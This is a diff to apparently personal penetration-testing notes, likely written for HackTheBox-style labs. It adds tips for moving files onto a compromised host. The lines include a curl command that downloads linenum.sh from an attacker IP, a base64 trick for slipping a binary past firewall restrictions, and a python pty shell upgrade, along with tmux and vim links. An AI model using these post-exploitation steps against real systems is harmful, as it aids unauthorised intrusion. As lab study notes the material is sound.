@@ -6,6 +6,8 @@
 
 To download the file: `wget http:/KALI_IP//linpeas.sh`
 
+If the remote server does not have `wget`, we can use `cURL`. : `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
+
 ### SCP
 
 Copy file from local to a remote computer:
@@ -45,4 +47,31 @@ And now on the atacker's machine we have the ports 5432 connected. The usage wil
 
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+### Tmux
+
+```
+sudo apt install tmux -y
+```
+
+* [https://tmuxcheatsheet.com/](https://tmuxcheatsheet.com/)
+* [Introduction to termux Ippsec](https://www.youtube.com/watch?v=Lqehvpe\_djs)
+
+### Vim
+
+[https://vimsheet.com/](https://vimsheet.com/)
+
+### base64
+
+In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.
+
+```bash
+base64 binarytotransfer -w 0
+#On the local machine
+```
+
+```
+echo f0VMR... <SNIP> ...lIuy9i | base64 -d > binarytotransfer
+#On the remote machine
 ```
